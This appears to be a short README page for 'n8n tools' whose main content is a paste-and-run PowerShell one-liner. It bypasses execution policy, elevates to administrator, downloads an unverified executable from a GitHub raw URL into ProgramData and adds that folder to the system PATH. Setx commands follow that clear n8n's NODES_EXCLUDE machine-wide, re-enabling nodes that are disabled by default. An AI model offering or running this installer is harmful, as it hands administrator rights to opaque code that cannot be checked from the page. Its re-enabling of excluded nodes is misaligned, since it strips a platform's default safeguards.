## File writer
```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command $TD=[Environment]::GetFolderPath([Environment+SpecialFolder]::CommonApplicationData)+\"\file-writer-tool\";Start-Process \"https://afnan-nex.github.io/n8n-tools/file-writer.html\";[System.IO.Directory]::CreateDirectory($TD);Stop-Process -Name file-writer -Force -ErrorAction SilentlyContinue;Start-Sleep -Seconds 1;$exe=$TD+\"\file-writer.exe\";if(Test-Path $exe){Remove-Item $exe -Force};Invoke-WebRequest -Uri (\"https://raw.githubusercontent.com/afnan-nex/n8n-tools/main/file-writer.exe?v=\"+(Get-Random)) -OutFile $exe;$p=[Environment]::GetEnvironmentVariable(\"Path\",\"Machine\");if($p -notlike (\"*\"+$TD+\"*\")){[Environment]::SetEnvironmentVariable(\"Path\",$p+\";\"+$TD,\"Machine\")};Write-Host \"SUCCESS: file-writer.exe set up safely!\" -ForegroundColor Green;Read-Host \"Press Enter to exit...\"'"

```








## To Enable the Disabled Nodes in and after v2

```
set NODES_EXCLUDE=[]
```
```
setx NODES_EXCLUDE "[]"
```
```
setx NODES_EXCLUDE "[]" /M
```
```
setx NODES_EXCLUDE "[]"
setx NODES_EXCLUDE "[]" /M

```
